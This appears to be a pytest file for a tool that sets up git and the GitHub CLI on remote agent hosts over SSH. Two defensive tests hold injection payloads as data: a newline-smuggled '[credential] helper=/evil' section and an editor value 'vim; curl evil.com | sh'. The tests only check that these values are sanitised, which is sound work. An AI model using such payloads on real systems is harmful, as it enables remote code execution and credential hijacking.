"""Tests for `lifecycle_canonical._setup_github_integration` (#649).

The hook replaces the per-agent-type `GitHub CLI authentication block`
and `Render ~/.gitconfig` tasks that used to live in each
configure.yaml. Those never ran on the modern `clawctl agent sync`
path — same class of bug that #755 and #834 closed for other
integrations.

These tests exercise the hook against a mocked paramiko client and
verify:
  - the fast no-op path (no git/github integration attached),
  - gitconfig body is written for `git` integrations,
  - `gh auth login` + `gh auth setup-git` fire in order for `github`,
  - ordering across the two: gitconfig THEN setup-git (setup-git
    appends to gitconfig; a later gitconfig overwrite would drop the
    credential.helper line),
  - failure at any step raises `CanonicalSyncError`,
  - the drain-before-recv pattern (stdout/stderr `.read()` before
    `.recv_exit_status()`) is honored so a chatty `gh` subprocess
    can't wedge SSH's ~64KB pipe buffer,
  - macOS home root is used when `host.os_family == "darwin"`.
"""

from __future__ import annotations

from unittest.mock import MagicMock

import paramiko
import pytest

from clawrium.core.lifecycle_canonical import (
    CanonicalSyncError,
    _render_gitconfig_body,
    _setup_github_integration,
)
from clawrium.core.render import IntegrationInputs, RenderInputs, ProviderInputs


def _exec_stub(exit_status: int, *, stdout: bytes = b"", stderr: bytes = b""):
    """Paramiko `exec_command` return triple."""
    stdin = MagicMock()
    out = MagicMock()
    out.channel.recv_exit_status.return_value = exit_status
    out.read.return_value = stdout
    err = MagicMock()
    err.read.return_value = stderr
    return stdin, out, err


def _inputs(*integrations: IntegrationInputs) -> RenderInputs:
    """Minimum-viable RenderInputs carrying the given integrations."""
    return RenderInputs(
        agent_name="alpha",
        agent_type="hermes",
        provider=ProviderInputs(name="p", type="openrouter", default_model="x"),
        integrations=tuple(integrations),
    )


def _git_integration(name: str = "identity", **creds) -> IntegrationInputs:
    return IntegrationInputs(
        name=name,
        type="git",
        credentials=tuple(sorted(creds.items())),
    )


def _github_integration(
    name: str = "clawrium-github", token: str = "ghp_test123"
) -> IntegrationInputs:
    return IntegrationInputs(
        name=name,
        type="github",
        credentials=(("GITHUB_TOKEN", token),),
    )


# ---------------------------------------------------------------------------
# _render_gitconfig_body — pure function
# ---------------------------------------------------------------------------


def test_render_gitconfig_body_uses_defaults_when_credentials_missing():
    body = _render_gitconfig_body({})
    assert "[user]" in body
    assert "name = " in body  # empty name is fine, but the key stays
    assert "email = " in body
    assert "defaultBranch = main" in body  # default when missing
    assert "rebase = false" in body
    assert "editor = vim" in body


def test_render_gitconfig_body_interpolates_all_five_credentials():
    body = _render_gitconfig_body({
        "GIT_USER_NAME": "Alice",
        "GIT_USER_EMAIL": "alice@example.com",
        "GIT_INIT_DEFAULT_BRANCH": "trunk",
        "GIT_PULL_REBASE": "true",
        "GIT_CORE_EDITOR": "nano",
    })
    assert "name = Alice" in body
    assert "email = alice@example.com" in body
    assert "defaultBranch = trunk" in body
    assert "rebase = true" in body
    assert "editor = nano" in body


def test_render_gitconfig_body_strips_crlf_and_null_for_injection_defense():
    """A tampered secrets store must not be able to inject a
    `[credential] helper=/evil` section by embedding newlines in
    `GIT_USER_NAME`."""
    body = _render_gitconfig_body({
        "GIT_USER_NAME": "Alice\n[credential]\n\thelper=/evil",
        "GIT_USER_EMAIL": "alice\r@example.com",
    })
    # The injected section markers get flattened to a single line.
    assert "\n[credential]" not in body
    assert "\r" not in body
    assert "\x00" not in body


def test_render_gitconfig_body_strips_shell_metachars_from_core_editor():
    """GIT_CORE_EDITOR is invoked by git via `sh -c '<editor> <file>'`, so
    a tampered secrets store with shell metacharacters could execute
    arbitrary code as the agent user the next time git opens an editor."""
    body = _render_gitconfig_body({
        "GIT_CORE_EDITOR": "vim; curl evil.com | sh",
    })
    editor_line = next(
        line for line in body.splitlines() if line.strip().startswith("editor")
    )
    for meta in (";", "|", "&", "`", "$", "(", ")", "<", ">", "\\"):
        assert meta not in editor_line, (
            f"shell metachar {meta!r} leaked into rendered editor line: "
            f"{editor_line!r}"
        )


# ---------------------------------------------------------------------------
# _setup_github_integration — gate behavior
# ---------------------------------------------------------------------------


def test_no_integrations_is_fast_noop_no_ssh_calls():
    client = MagicMock()
    _setup_github_integration(
        client,
        "alpha",
        host={"os_family": "linux"},
        inputs=_inputs(),
    )
    client.exec_command.assert_not_called()


def test_only_non_git_non_github_integrations_is_noop():
    client = MagicMock()
    other = IntegrationInputs(name="brave", type="brave", credentials=())
    _setup_github_integration(
        client,
        "alpha",
        host={"os_family": "linux"},
        inputs=_inputs(other),
    )
    client.exec_command.assert_not_called()


# ---------------------------------------------------------------------------
# Git integration → gitconfig write
# ---------------------------------------------------------------------------


def test_git_integration_writes_gitconfig_via_tee_as_agent_user():
    client = MagicMock()
    client.exec_command.return_value = _exec_stub(0)
    _setup_github_integration(
        client,
        "alpha",
        host={"os_family": "linux"},
        inputs=_inputs(_git_integration(GIT_USER_NAME="A", GIT_USER_EMAIL="a@x")),
    )
    assert client.exec_command.call_count == 1
    cmd = client.exec_command.call_args_list[0].args[0]
    assert "sudo -n -H -u alpha" in cmd
    assert "tee /home/alpha/.gitconfig" in cmd
    assert "chmod 0600 /home/alpha/.gitconfig" in cmd


def test_git_integration_writes_body_via_stdin():
    client = MagicMock()
    stdin_mock = MagicMock()
    stub = list(_exec_stub(0))
    stub[0] = stdin_mock
    client.exec_command.return_value = tuple(stub)
    _setup_github_integration(
        client,
        "alpha",
        host={"os_family": "linux"},
        inputs=_inputs(_git_integration(GIT_USER_NAME="Alice", GIT_USER_EMAIL="a@x")),
    )
    # stdin.write receives the full gitconfig body
    written = "".join(c.args[0] for c in stdin_mock.write.call_args_list)
    assert "name = Alice" in written
    assert "email = a@x" in written
    stdin_mock.channel.shutdown_write.assert_called_once()


def test_git_integration_raises_on_tee_failure():
    client = MagicMock()
    client.exec_command.return_value = _exec_stub(1, stderr=b"tee: no perms")
    with pytest.raises(CanonicalSyncError, match="gitconfig write failed"):
        _setup_github_integration(
            client,
            "alpha",
            host={"os_family": "linux"},
            inputs=_inputs(_git_integration()),
        )


def test_git_integration_uses_macos_home_root_on_darwin_host():
    client = MagicMock()
    client.exec_command.return_value = _exec_stub(0)
    _setup_github_integration(
        client,
        "alpha",
        host={"os_family": "darwin"},
        inputs=_inputs(_git_integration()),
    )
    cmd = client.exec_command.call_args_list[0].args[0]
    assert "tee /Users/alpha/.gitconfig" in cmd


# ---------------------------------------------------------------------------
# Github integration → gh auth login + setup-git
# ---------------------------------------------------------------------------


def test_github_integration_runs_login_then_setup_git_in_order():
    client = MagicMock()
    client.exec_command.side_effect = [
        _exec_stub(0),  # gh auth login
        _exec_stub(0),  # gh auth setup-git
    ]
    _setup_github_integration(
        client,
        "alpha",
        host={"os_family": "linux"},
        inputs=_inputs(_github_integration()),
    )
    assert client.exec_command.call_count == 2
    login_cmd = client.exec_command.call_args_list[0].args[0]
    setup_cmd = client.exec_command.call_args_list[1].args[0]
    assert "gh auth login --with-token" in login_cmd
    assert "sudo -n -H -u alpha" in login_cmd
    assert setup_cmd.endswith("gh auth setup-git")
    assert "sudo -n -H -u alpha" in setup_cmd


def test_github_integration_pipes_token_via_stdin():
    client = MagicMock()
    stdin_login = MagicMock()
    login_stub = list(_exec_stub(0))
    login_stub[0] = stdin_login
    client.exec_command.side_effect = [tuple(login_stub), _exec_stub(0)]
    _setup_github_integration(
        client,
        "alpha",
        host={"os_family": "linux"},
        inputs=_inputs(_github_integration(token="ghp_secret")),
    )
    written = "".join(c.args[0] for c in stdin_login.write.call_args_list)
    assert "ghp_secret" in written
    stdin_login.channel.shutdown_write.assert_called_once()


def test_github_integration_raises_when_token_missing():
    client = MagicMock()
    bad_integration = IntegrationInputs(
        name="broken-github", type="github", credentials=()
    )
    with pytest.raises(CanonicalSyncError, match="GITHUB_TOKEN credential is missing"):
        _setup_github_integration(
            client,
            "alpha",
            host={"os_family": "linux"},
            inputs=_inputs(bad_integration),
        )
    client.exec_command.assert_not_called()


def test_github_integration_raises_on_login_failure():
    client = MagicMock()
    client.exec_command.side_effect = [
        _exec_stub(1, stderr=b"gh: bad token"),
    ]
    with pytest.raises(CanonicalSyncError, match="gh auth login failed"):
        _setup_github_integration(
            client,
            "alpha",
            host={"os_family": "linux"},
            inputs=_inputs(_github_integration()),
        )


def test_github_integration_raises_on_setup_git_failure():
    client = MagicMock()
    client.exec_command.side_effect = [
        _exec_stub(0),  # login ok
        _exec_stub(1, stderr=b"gh auth setup-git: config write denied"),
    ]
    with pytest.raises(CanonicalSyncError, match="gh auth setup-git failed"):
        _setup_github_integration(
            client,
            "alpha",
            host={"os_family": "linux"},
            inputs=_inputs(_github_integration()),
        )


# ---------------------------------------------------------------------------
# Combined git + github: ordering invariant
# ---------------------------------------------------------------------------


def test_git_render_precedes_gh_setup_when_both_attached():
    """setup-git appends `[credential]` to ~/.gitconfig. If gitconfig
    render ran AFTER setup-git, the credential.helper line would be
    silently dropped by the template overwrite."""
    client = MagicMock()
    client.exec_command.side_effect = [
        _exec_stub(0),  # gitconfig tee
        _exec_stub(0),  # gh auth login
        _exec_stub(0),  # gh auth setup-git
    ]
    _setup_github_integration(
        client,
        "alpha",
        host={"os_family": "linux"},
        inputs=_inputs(_git_integration(), _github_integration()),
    )
    calls = [c.args[0] for c in client.exec_command.call_args_list]
    assert len(calls) == 3
    assert "tee /home/alpha/.gitconfig" in calls[0]
    assert "gh auth login --with-token" in calls[1]
    assert calls[2].endswith("gh auth setup-git")


# ---------------------------------------------------------------------------
# Drain-before-recv pattern (avoid ~64KB SSH pipe wedge)
# ---------------------------------------------------------------------------


def test_stdout_stderr_drained_before_recv_exit_status():
    """`gh auth login` and `gh auth setup-git` can emit warnings and
    banner output that fills the ~64KB SSH pipe buffer. Calling
    `.recv_exit_status()` before `.read()` blocks indefinitely.
    Mirrors the pattern established by `_openclaw_install_plugins`."""
    client = MagicMock()
    call_order: list[str] = []

    stdin = MagicMock()
    out = MagicMock()
    err = MagicMock()

    def _read_out():
        call_order.append("stdout.read")
        return b""

    def _read_err():
        call_order.append("stderr.read")
        return b""

    def _recv():
        call_order.append("recv_exit_status")
        return 0

    out.read.side_effect = _read_out
    err.read.side_effect = _read_err
    out.channel.recv_exit_status.side_effect = _recv
    client.exec_command.return_value = (stdin, out, err)

    _setup_github_integration(
        client,
        "alpha",
        host={"os_family": "linux"},
        inputs=_inputs(_git_integration()),
    )

    # Both reads must complete before recv_exit_status.
    assert call_order.index("stdout.read") < call_order.index("recv_exit_status")
    assert call_order.index("stderr.read") < call_order.index("recv_exit_status")


def test_stdout_stderr_drained_before_recv_for_github_login_and_setup_git():
    """Same drain-before-recv invariant, but for the github path.

    `gh auth login --with-token` and `gh auth setup-git` are the chatty
    calls most likely to fill the ~64KB SSH pipe buffer (login banner,
    setup-git advice output). Both must drain both pipes before
    recv_exit_status."""
    client = MagicMock()
    call_orders: list[list[str]] = []

    def _mk_stub(idx: int):
        stdin = MagicMock()
        out = MagicMock()
        err = MagicMock()
        order: list[str] = []
        call_orders.append(order)

        def _read_out():
            order.append("stdout.read")
            return b""

        def _read_err():
            order.append("stderr.read")
            return b""

        def _recv():
            order.append("recv_exit_status")
            return 0

        out.read.side_effect = _read_out
        err.read.side_effect = _read_err
        out.channel.recv_exit_status.side_effect = _recv
        return (stdin, out, err)

    client.exec_command.side_effect = [_mk_stub(0), _mk_stub(1)]
    _setup_github_integration(
        client,
        "alpha",
        host={"os_family": "linux"},
        inputs=_inputs(_github_integration()),
    )
    # Both the login and the setup-git call orders must drain first.
    for order in call_orders:
        assert order.index("stdout.read") < order.index("recv_exit_status")
        assert order.index("stderr.read") < order.index("recv_exit_status")


# ---------------------------------------------------------------------------
# Whitespace-only token → clean error
# ---------------------------------------------------------------------------


def test_github_integration_whitespace_only_token_raises_clean_error():
    """A whitespace-only token is truthy under `if not token:` but
    meaningless. Guard should treat it as missing rather than piping
    whitespace to `gh auth login` and surfacing a confusing gh-side
    error."""
    client = MagicMock()
    bad = IntegrationInputs(
        name="ws-github", type="github", credentials=(("GITHUB_TOKEN", "   "),)
    )
    with pytest.raises(CanonicalSyncError, match="GITHUB_TOKEN credential is missing"):
        _setup_github_integration(
            client,
            "alpha",
            host={"os_family": "linux"},
            inputs=_inputs(bad),
        )
    client.exec_command.assert_not_called()


# ---------------------------------------------------------------------------
# on_event exercised on both paths
# ---------------------------------------------------------------------------


def test_on_event_fires_for_git_and_github_paths():
    client = MagicMock()
    client.exec_command.side_effect = [
        _exec_stub(0),  # git tee
        _exec_stub(0),  # gh auth login
        _exec_stub(0),  # gh auth setup-git
    ]
    on_event = MagicMock()
    _setup_github_integration(
        client,
        "alpha",
        host={"os_family": "linux"},
        inputs=_inputs(_git_integration("id"), _github_integration("gh1")),
        on_event=on_event,
    )
    # Two events: one for git write, one for github wiring.
    assert on_event.call_count == 2
    kinds = [c.args[0] for c in on_event.call_args_list]
    messages = [c.args[1] for c in on_event.call_args_list]
    assert kinds == ["github_integration", "github_integration"]
    assert "'id'" in messages[0]
    assert "'gh1'" in messages[1]


# ---------------------------------------------------------------------------
# Idempotency
# ---------------------------------------------------------------------------


def test_idempotent_second_call_same_ssh_pattern():
    """Docstring claims idempotency without a sentinel-skip path. Calling
    the hook twice against a client scripted for both invocations must
    produce the same exec_command shape both times — protects against a
    future skip-path regression (#437 pattern)."""
    client = MagicMock()
    # 3 execs per call × 2 calls = 6 stubs.
    client.exec_command.side_effect = [_exec_stub(0) for _ in range(6)]
    for _ in range(2):
        _setup_github_integration(
            client,
            "alpha",
            host={"os_family": "linux"},
            inputs=_inputs(_git_integration(), _github_integration()),
        )
    assert client.exec_command.call_count == 6
    first_call_cmds = [c.args[0] for c in client.exec_command.call_args_list[:3]]
    second_call_cmds = [c.args[0] for c in client.exec_command.call_args_list[3:]]
    assert first_call_cmds == second_call_cmds


# ---------------------------------------------------------------------------
# Secrets and PII never in argv (only in stdin / rendered body)
# ---------------------------------------------------------------------------


def test_github_token_never_appears_in_exec_command_argv():
    """Token must arrive via stdin, never via the command string that
    ends up in ps/audit logs."""
    client = MagicMock()
    client.exec_command.side_effect = [_exec_stub(0), _exec_stub(0)]
    _setup_github_integration(
        client,
        "alpha",
        host={"os_family": "linux"},
        inputs=_inputs(_github_integration(token="ghp_verysecret_deadbeef")),
    )
    for call in client.exec_command.call_args_list:
        cmd = call.args[0]
        assert "ghp_verysecret_deadbeef" not in cmd, (
            f"token leaked into exec_command argv: {cmd!r}"
        )


def test_gitconfig_pii_never_appears_in_exec_command_argv():
    """GIT_USER_NAME / GIT_USER_EMAIL must arrive via stdin. The old
    Ansible task carried `no_log: true` to keep PII out of run logs;
    the Python path must keep the same invariant by staying out of
    exec_command argv (which flows to structured event / debug logs)."""
    client = MagicMock()
    client.exec_command.return_value = _exec_stub(0)
    _setup_github_integration(
        client,
        "alpha",
        host={"os_family": "linux"},
        inputs=_inputs(_git_integration(
            GIT_USER_NAME="Alice Confidential",
            GIT_USER_EMAIL="alice.confidential@example.com",
        )),
    )
    for call in client.exec_command.call_args_list:
        cmd = call.args[0]
        assert "Alice Confidential" not in cmd
        assert "alice.confidential@example.com" not in cmd


# ---------------------------------------------------------------------------
# Transport errors surface as CanonicalSyncError (not raw paramiko)
# ---------------------------------------------------------------------------


def test_ssh_exception_wrapped_as_canonical_sync_error():
    """paramiko.SSHException from exec_command must be caught and
    re-raised as CanonicalSyncError so the hook's failure surface is
    uniform with its own exit-code branches. Otherwise raw transport
    errors bypass the module's error contract."""
    client = MagicMock()
    client.exec_command.side_effect = paramiko.SSHException("channel reset")
    with pytest.raises(CanonicalSyncError, match="SSH transport error"):
        _setup_github_integration(
            client,
            "alpha",
            host={"os_family": "linux"},
            inputs=_inputs(_git_integration()),
        )


def test_socket_timeout_wrapped_as_canonical_sync_error():
    """socket.timeout (a subclass of OSError) from paramiko must also
    normalize into CanonicalSyncError."""
    import socket

    client = MagicMock()
    client.exec_command.side_effect = socket.timeout("gh auth login stalled")
    with pytest.raises(CanonicalSyncError, match="SSH transport error"):
        _setup_github_integration(
            client,
            "alpha",
            host={"os_family": "linux"},
            inputs=_inputs(_github_integration()),
        )
